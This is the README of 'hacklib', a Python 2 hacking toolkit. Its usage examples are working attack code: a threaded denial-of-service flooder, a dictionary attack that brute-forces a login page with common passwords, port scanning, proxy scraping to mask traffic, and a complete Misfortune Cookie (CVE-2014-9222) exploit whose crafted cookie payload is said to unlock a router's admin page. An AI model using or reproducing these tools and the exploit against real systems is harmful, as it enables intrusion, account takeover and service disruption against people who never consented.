# hacklib
![MIT License](https://img.shields.io/github/license/mashape/apistatus.svg)
[![Python 2.6|2.7](https://img.shields.io/badge/python-2.6|2.7-yellow.svg)](https://www.python.org/)
##### Toolkit for hacking enthusiasts using Python.
hacklib is a Python module for hacking enthusiasts interested in network security. It is currently in active development.

-
#### Installation
To get hacklib, simply run in command line:
```console
pip install hacklib
```

-
#### Usage Examples
-
Multi-threaded Denial of Service (DOS) stress-testing:
```python
import hacklib

dos = hacklib.DOSer()
# Create 50 threads to send GET requests for 30 seconds
dos.launch('127.0.0.1', duration=30, threads=50)
```
-
Universal login client for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:

```python
import hacklib

ac = hacklib.AuthClient()
# Logging into a gmail account
htmldata = ac.login('https://gmail.com', 'email', 'password')

# Check for a string in the resulting page
if 'Inbox' in htmldata: print 'Login Success.'
else: print 'Login Failed.'

# For logins using HTTP Basic Auth:
try: 
    htmldata = ac.login('http://somewebsite.com', 'admin', 'password')
except: pass #login failed
```
Simple dictionary attack using AuthClient:
```python
import hacklib

ac = hacklib.AuthClient()
# Get the top 100 most common passwords
passwords = hacklib.topPasswords(100)

for p in passwords:
    htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
    if htmldata and 'welcome' in htmldata.lower():
        print 'Password is', p
        break
```
-
Port Scanning:
```python
from hacklib import *

ps = PortScanner()
ps.scan(getIP('yourwebsite.com'))
# By default scans the first 1024 ports. Use ps.scan(IP, port_range=(n1, n2), timeout=i) to change default

# After a scan, open ports are saved within ps for reference
if ps.portOpen(80):
    # Establish a TCP stream and sends a message
    send(getIP('yourwebsite.com'), 80, message='GET HTTP/1.1 \r\n')
```

Misfortune Cookie Exploit (CVE-2014-9222) using PortScanner:
```python
>>> import hacklib

# Discovery
>>> ps = hacklib.PortScanner()
>>> ps.scan('192.168.1.1', (80, 81))
Port 80:
HTTP/1.1 404 Not Found
Content-Type: text/html
Transfer-Encoding: chunked
Server: RomPager/4.07 UPnP/1.0
EXT:
# The banner for port 80 shows us that the server uses RomPager 4.07. This version is exploitable.

# Exploitation
>>> payload = '''GET /HTTP/1.1
Host: 192.168.1.1
User-Agent: googlebot
Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate
Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
>>> hacklib.send('192.168.1.1', 80, payload)
# The cookie replaced the firmware's memory allocation for web authentication with a null bye.
# The router's admin page is now fully accessible from any web browser.
```
-
FTP authentication:
```python
import hacklib
ftp = hacklib.FTPAuth('127.0.0.1', 21)
try:
    ftp.login('username', 'password')
except:
    print 'Login failed.'
```
-
Socks4/5 proxy scraping and tunneling
```python
>>> import hacklib
>>> import urllib2
>>> proxylist = hacklib.getProxies() # scrape recently added socks proxies from the internet
>>> proxy = hacklib.Proxy()
>>> proxy.connect(proxylist) # automatically find and connect to a working proxy in proxylist
>>> proxy.IP
u'41.203.214.58'
>>> proxy.port
65000
>>> proxy.country
u'KE'
# All Python network activity across all modules are routed through the proxy:
>>> urllib2.urlopen('http://icanhazip.com/').read() 
'41.203.214.58\n'
# Notes: Only network activity via Python are masked by the proxy.
# Network activity on other programs such as your webbrowser remain unmasked.
# To filter proxies by country and type:
# proxylist = hacklib.getProxies(country_filter = ('RU', 'CA', 'SE'), proxy_type='Socks5')
```
